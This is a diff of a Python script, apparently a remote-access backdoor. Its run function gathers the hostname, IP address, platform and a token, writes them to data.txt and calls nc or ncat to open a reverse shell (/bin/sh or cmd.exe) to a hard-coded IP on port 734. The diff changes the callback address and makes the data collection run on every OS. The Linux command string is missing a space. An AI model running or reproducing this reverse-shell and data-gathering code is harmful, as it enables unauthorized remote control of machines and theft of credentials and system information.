@@ -34,7 +34,7 @@ def upload_File(filename,sha=None):
 def run(token):
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
-    iph='192.168.1.212'
+    iph='172.16.22.31'
     fname="data.txt"
     print('')
     print(' ############### # # # ##############')
@@ -43,28 +43,20 @@ def run(token):
     print(' ####### #######  #  #  ######## ####')
     print(' ################ ### ###############')
     print('')
-    print('# OS name: ', platform.system())
+    print('# OS name ////\\\\ ###: ', platform.system())
+    print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
+    print(' IpAddress: ', IPAddr)
+    print('TokenData: ', token)
+    stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
+    print(stmnt)
+    create_file(fname,stmnt)
     if "Linux" in platform.system():
-        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
-        print(' IpAddress: ', IPAddr)
-        print('TokenData: ', token)
-        stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
-        print(stmnt)
-	#create_file(fname,stmnt)
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
         os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
-        print('Address ip: ', IPAddr)
-        print('TokenData: ', token)
-        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
-        print("text stmnt: "+ stmnt)
-        create_file(fname,stmnt)
         #pdate_file(token,fname)
         #delete_file(fname)
-        
         #os.system('ncat -lvp 734 -e cmd.exe')
-        
         os.system('ncat '+ iph +' 734 -e cmd.exe')
     
